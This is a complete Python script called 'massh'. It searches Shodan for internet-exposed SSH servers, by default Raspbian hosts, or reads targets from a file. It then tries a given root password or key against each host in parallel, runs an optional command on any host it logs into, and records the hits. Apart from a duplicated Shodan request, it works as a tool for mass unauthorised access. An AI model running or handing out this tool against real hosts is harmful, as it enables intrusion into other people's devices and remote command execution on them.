#!/usr/bin/env python3

import argparse
import os
import socket
import sys
import time
import logging
from multiprocessing import Pool
from functools import partial

log = logging.getLogger("massh")
logging.basicConfig(
	level=logging.INFO,
	format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
	handlers=[
		logging.StreamHandler()
	]
)

# External modules
try:
	import paramiko
	import requests
except ImportError as e:
	log.critical('Failed to import an external module (%s).' % str(e))
	log.critical('Please install the required modules inside the requirements.txt file.')
	sys.exit(1)

__version__ = "3.0"

def error_to_string(code: int) -> str:
	"""
	Map the integer return_code from connect() to a readable string.
	"""
	error_map = {
		0: "SUCCESS",
		1: "ERR_AUTH",
		2: "ERR_CONNECTION",
		3: "ERR_TIMEOUT",
		4: "ERR_SSH",
		5: "ERR_UNKNOWN",
		9: "ERR_KEYBOARD_INTERRUPT"
	}
	return error_map.get(code, "ERR_UNKNOWN")


def shodan_search(apikey: str, search_string: str, limit: int = 100):
	"""
	Poll Shodan for results using the given API key and search string.
	"""
	res = requests.get(f"https://api.shodan.io/shodan/host/search?key={apikey}&query={search_string}&limit={limit}").json()
	try:
		results = requests.get(f"https://api.shodan.io/shodan/host/search?key={apikey}&query={search_string}&limit={limit}").json()
		return [f"{match['ip_str']}:{match['port']}" for match in results['matches']]
	except Exception as e:
		log.critical(f"Shodan API Error: {type(e).__name__}: {str(e)}", exc_info=True)
		sys.exit(1)


def connect(
	ip: str,
	port: int,
	outfile: str,
	username: str,
	password: str = None,
	key: str = None,
	cmd: str = None
):
	"""
	Attempt an SSH connection. If successful, append the IP (and optionally
	command output) to 'outfile'.

	Return: (return_code, command_output_or_None)
	return_code == 0 -> success
	"""
	ssh_client = paramiko.SSHClient()
	ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	return_code = 5  # Default: ERR_UNKNOWN
	command_output = None

	try:
		# Connect
		if password is not None:
			ssh_client.connect(
				ip, port=port, username=username,
				password=password, timeout=5, look_for_keys=False
			)
		else:
			ssh_client.connect(
				ip, port=port, username=username,
				key_filename=key, timeout=5
			)

		# If we get here, connection/auth was successful
		return_code = 0

		# Optional command execution
		if cmd:
			stdin, stdout, stderr = ssh_client.exec_command(cmd)
			# small sleep to let the command run, can be removed or adjusted
			time.sleep(1)
			stdin.close()
			command_output = stdout.read().decode("utf-8").strip()

		# Write success info to file
		with open(outfile, 'a') as fl:
			fl.write(ip)
			if command_output:
				fl.write(f' | {command_output}')
			fl.write('\n')

	except paramiko.AuthenticationException:
		return_code = 1  # ERR_AUTH
	except paramiko.ssh_exception.NoValidConnectionsError:
		return_code = 2  # ERR_CONNECTION
	except (socket.error, socket.timeout):
		return_code = 3  # ERR_TIMEOUT
	except paramiko.ssh_exception.SSHException:
		return_code = 4  # ERR_SSH
	except KeyboardInterrupt:
		return_code = 9  # ERR_KEYBOARD_INTERRUPT
	except:
		return_code = 5  # ERR_UNKNOWN
	finally:
		ssh_client.close()

	return return_code, command_output


def check(
	ipport: str,
	username: str,
	outfile: str,
	password: str = None,
	key: str = None,
	cmd: str = None
) -> int:
	"""
	Worker function for multi-threaded checks.
	ipport is "ip:port".

	Returns the status code from connect(), e.g. 0 = success, anything else = fail.
	"""
	log = logging.getLogger(f"massh-{ipport}")
	logging.getLogger("paramiko").setLevel(logging.WARNING)
	log.debug(f"check({ipport}, {username}, {outfile}, {password}, {key}, {cmd})")

	ip, port_str = ipport.split(':')
	port = int(port_str)

	status, cmd_out = connect(
		ip,
		port,
		outfile,
		username,
		password=password,
		key=key,
		cmd=cmd
	)

	if status == 0:
		# Success
		if cmd:
			# Show command output if a command was run
			log.info(cmd_out)
		else:
			log.info("Auth success")
	else:
		# Debugging info on failure
		log.debug(f"FAILED FOR {ip} -- {error_to_string(status)}")

	return status


def main():
	parser = argparse.ArgumentParser(description="massh (Mass-SSH): multithreaded ssh credential tester")

	# Either input file or Shodan key is required
	argsource = parser.add_mutually_exclusive_group(required=True)
	argsource.add_argument('-f', '--file', help='Input file (one IP:port per line)', metavar='FILE')
	argsource.add_argument('-k', '--shodan-key', help='Set Shodan API key', type=str)

	# Shodan search query (useful if using Shodan)
	parser.add_argument('-q', '--query', help='Set Shodan search query', type=str, default='Raspbian product:"OpenSSH"')

	# SSH username
	parser.add_argument('-u', '--username', help='Set username [default: root]', type=str, default='root', required=True)

	# Auth method
	auth_method = parser.add_mutually_exclusive_group(required=True)
	auth_method.add_argument('-p', '--password', help='Set password', type=str)
	auth_method.add_argument('-i', '--ssh-key', help='Set SSH key path', type=str)

	# Optional command to run
	parser.add_argument('-c', '--command', help='Command to run after successful connection', metavar='CMD', type=str)

	# Output file for successful IPs
	parser.add_argument(
		'-o', '--output',
		help='Output successful IPs to FILE [default: successful.log]',
		metavar='FILE',
		type=str,
		default='successful.log'
	)

	# Concurrency settings
	parser.add_argument('-t', '--threads', help='Threads for multiprocessing [default: 8]', type=int, default=8)
	parser.add_argument('--limit', help='Limit number of Shodan results [default: 100]', type=int, default=100)

	# Debugging
	parser.add_argument('--debug', help='Show debug information [default: off]', action='store_true')
	parser.add_argument('--singlethreaded', help='Disable multiprocessing [default: off]', action='store_true')

	args = parser.parse_args()

	## Start app
	log.info(f"massh {__version__}")
	
	# Debugging
	if args.debug:
		log.setLevel(logging.DEBUG)
		logging.getLogger("paramiko").setLevel(logging.DEBUG)

	# Gather targets from input file or Shodan
	if args.file:
		# Check the input file
		if not os.path.isfile(args.file):
			log.critical(f"Input file '{args.file}' doesn't exist!")
			sys.exit(1)
		elif os.path.getsize(args.file) == 0:
			log.critical(f"Input file '{args.file}' is empty!")
			sys.exit(1)
		else:
			log.info(f"Reading from '{args.file}'")
			with open(args.file, 'r') as infile:
				targets = [line.strip() for line in infile if line.strip()]
	else:
		# Shodan
		log.info(f"Searching Shodan for '{args.query}'")
		targets = shodan_search(args.shodan_key, args.query, limit=args.limit)

	log.info(f"Found {len(targets)} hosts")

	total_tried = 0
	total_success = 0
	total_hosts = len(targets)

	try:
		if args.singlethreaded:
			# Single-threaded execution
			for ipport in targets:
				status = check(
					ipport,
					args.username,
					args.output,
					password=args.password,
					key=args.ssh_key,
					cmd=args.command
				)
				total_tried += 1
				if status == 0:
					total_success += 1
		else:
			# Multi-processing
			with Pool(processes=args.threads) as pool:
				# partial() allows us to fix some arguments while leaving 'ipport' free.
				worker = partial(
					check,
					username=args.username,
					outfile=args.output,
					password=args.password,
					key=args.ssh_key,
					cmd=args.command
				)

				for status in pool.imap_unordered(worker, targets):
					total_tried += 1
					if status == 0:
						total_success += 1
					if total_tried % 10 == 0:
						log.info(f"Progress: {total_tried}/{total_hosts} ({total_success} successes)")
	except KeyboardInterrupt:
		log.warning("\n[!] Ctrl + C pressed")

	log.info("Finished!")
	log.info(f"Total IPs tried/successes: {total_tried}/{total_success}")
	sys.exit(0)


if __name__ == "__main__":
	main()